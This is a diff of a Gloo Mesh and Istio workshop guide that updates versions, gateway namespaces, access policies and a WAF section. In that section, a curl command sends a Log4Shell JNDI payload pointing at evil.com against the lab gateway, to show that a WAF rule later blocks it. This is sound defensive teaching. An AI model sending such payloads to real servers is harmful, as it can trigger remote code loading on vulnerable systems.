@@ -54,12 +54,12 @@ Set these environment variables which will be used throughout the workshop.
 ```sh
 # Used to enable Gloo Mesh (please ask for a trail license key)
 export GLOO_MESH_LICENSE_KEY=<licence_key>
-export GLOO_MESH_VERSION=v2.1.0-beta29
+export GLOO_MESH_VERSION=v2.1.0-rc3
 
 # Istio version information
 export ISTIO_IMAGE_REPO=us-docker.pkg.dev/gloo-mesh/istio-workshops
-export ISTIO_IMAGE_TAG=1.13.8-solo
-export ISTIO_VERSION=1.13.8
+export ISTIO_IMAGE_TAG=1.15.1-solo
+export ISTIO_VERSION=1.15.1
 ```
 
 ## Lab 1 - Configure/Deploy the Kubernetes clusters <a name="Lab-1"></a>
@@ -179,10 +179,12 @@ istioctl version
 2. Install Istio to each of the remote clusters. If you're using local Kubernetes clusters on a Mac M1 or M2, use [these ARM instructions](problems-istio-arm.md) instead.
 
 ```sh
-kubectl create namespace istio-gateways --context $CLUSTER1
+kubectl create namespace istio-ingress --context $CLUSTER1
+kubectl create namespace istio-eastwest --context $CLUSTER1
 istioctl install --set hub=$ISTIO_IMAGE_REPO --set tag=$ISTIO_IMAGE_TAG  -y --context $CLUSTER1 -f install/istio/istiooperator-cluster1.yaml
 
-kubectl create namespace istio-gateways --context $CLUSTER2
+kubectl create namespace istio-ingress --context $CLUSTER2
+kubectl create namespace istio-eastwest --context $CLUSTER2
 istioctl install --set hub=$ISTIO_IMAGE_REPO --set tag=$ISTIO_IMAGE_TAG  -y --context $CLUSTER2 -f install/istio/istiooperator-cluster2.yaml
 ```
 
@@ -262,7 +264,8 @@ spec:
     - name: ops-team
   - name: '*'
     namespaces:
-    - name: istio-gateways
+    - name: istio-ingress
+    - name: istio-eastwest
     - name: gloo-mesh-addons
 ---
 apiVersion: admin.gloo.solo.io/v2
@@ -329,7 +332,7 @@ spec:
         labels:
           istio: ingressgateway
         cluster: cluster1
-        namespace: istio-gateways
+        namespace: istio-ingress
   listeners: 
     - http: {}
       port:
@@ -379,7 +382,7 @@ Note the following settings.
 3. Open the Online Boutique in your browser
 
 ```sh
-export GLOO_GATEWAY=$(kubectl --context ${CLUSTER1} -n istio-gateways get svc istio-ingressgateway -o jsonpath='{.status.loadBalancer.ingress[0].*}'):80
+export GLOO_GATEWAY=$(kubectl --context ${CLUSTER1} -n istio-ingress get svc istio-ingressgateway -o jsonpath='{.status.loadBalancer.ingress[0].*}'):80
 
 echo "Online Boutique available at http://$GLOO_GATEWAY"
 ```
@@ -391,14 +394,19 @@ The backend APIs team employs a "Zero Trust" networking approach by enforcing se
 1. Add a default deny-all policy to the backend-apis namespace
 
 ```yaml
-cat << EOF | kubectl --context ${CLUSTER1} apply -f -
-apiVersion: security.istio.io/v1beta1
-kind: AuthorizationPolicy
+cat << EOF | kubectl --context ${MGMT} apply -f -
+apiVersion: security.policy.gloo.solo.io/v2
+kind: AccessPolicy
 metadata:
- name: default-deny
- namespace: backend-apis
+  name: allow-nothing
+  namespace: backend-apis-team
 spec:
-  {}
+  applyToWorkloads:
+  - {}
+  config:
+    authn:
+      tlsMode: STRICT
+    authz: {}
 EOF
 ```
 
@@ -651,13 +659,7 @@ kubectl --context $CLUSTER1 -n web-ui patch deploy frontend --patch '{"spec":{"t
 kubectl --context $CLUSTER1 -n web-ui patch deploy frontend --patch '{"spec":{"template":{"spec":{"containers":[{"name":"server","command":[],"readinessProbe":null,"livenessProbe":null}]}}}}'
 ```
 
-10. If the pod traffic does not go back to cluster1 you may need to recreate the frontend pod
-
-```sh
-kubectl delete pod -n web-ui -l app=frontend --context $CLUSTER1
-```
-
-11. Wait a few seconds and test that the frontend in cluster1 is working again.
+10. Wait a few seconds and test that the frontend in cluster1 is working again.
 
 ## Lab 10 - API Gateway <a name="Lab-10"></a>
 
@@ -700,7 +702,7 @@ In this section of the lab, take a quick look at how to prevent the `log4j` expl
 2. Confirm that a malicious JNDI request currently succeeds. Note the `200` success response. Later, you create a WAF policy to block such requests.
 
 ```sh
-curl -ik -I -X GET -H "User-Agent: \${jndi:ldap://evil.com/x}" http://$GLOO_GATEWAY
+curl -ik -X GET -H "User-Agent: \${jndi:ldap://evil.com/x}" http://$GLOO_GATEWAY
 ```
 
 3. With the Gloo Mesh WAF policy custom resource, you can create reusable policies for ModSecurity. Review the `log4j` WAF policy and the frontend route table. Note the following settings.
@@ -709,7 +711,7 @@ curl -ik -I -X GET -H "User-Agent: \${jndi:ldap://evil.com/x}" http://$GLOO_GATE
   * In the WAF policy config, the default core rule set is disabled. Instead, a custom rule set is created for the `log4j` attack.
 
 ```yaml
-kubectl --context ${MGMT} apply -f - <<EOF
+kubectl --context ${MGMT} apply -f - <<'EOF'
 apiVersion: security.policy.gloo.solo.io/v2
 kind: WAFPolicy
 metadata:
@@ -724,7 +726,7 @@ spec:
     disableCoreRuleSet: true
     customInterventionMessage: 'Log4Shell malicious payload'
     customRuleSets:
-    - ruleStr: |
+    - ruleStr: |-
         SecRuleEngine On
         SecRequestBodyAccess On
         SecRule REQUEST_LINE|ARGS|ARGS_NAMES|REQUEST_COOKIES|REQUEST_COOKIES_NAMES|REQUEST_BODY|REQUEST_HEADERS|XML:/*|XML://@*  
@@ -763,7 +765,7 @@ Another valuable feature of API gateways is integration into your IdP (Identity 
 openssl req -x509 -nodes -days 365 -newkey rsa:2048 \
    -keyout tls.key -out tls.crt -subj "/CN=*"
 
-kubectl --context ${CLUSTER1} -n istio-gateways create secret generic tls-secret \
+kubectl --context ${CLUSTER1} -n istio-ingress create secret generic tls-secret \
 --from-file=tls.key=tls.key \
 --from-file=tls.crt=tls.crt
 ```
@@ -782,7 +784,7 @@ spec:
         labels:
           istio: ingressgateway
         cluster: cluster1
-        namespace: istio-gateways
+        namespace: istio-ingress
   listeners:
     - http: {}
       port:
@@ -807,7 +809,7 @@ EOF
 3. Test out the new HTTPS endpoint (you may need to allow insecure traffic in your browser. Chrome: Advanced -> Proceed)
 
 ```sh
-export GLOO_GATEWAY=$(kubectl --context ${CLUSTER1} -n istio-gateways get svc istio-ingressgateway -o jsonpath='{.status.loadBalancer.ingress[0].*}'):443
+export GLOO_GATEWAY=$(kubectl --context ${CLUSTER1} -n istio-ingress get svc istio-ingressgateway -o jsonpath='{.status.loadBalancer.ingress[0].*}'):443
 echo "Secure Online Boutique URL: https://$GLOO_GATEWAY"
 ```
 
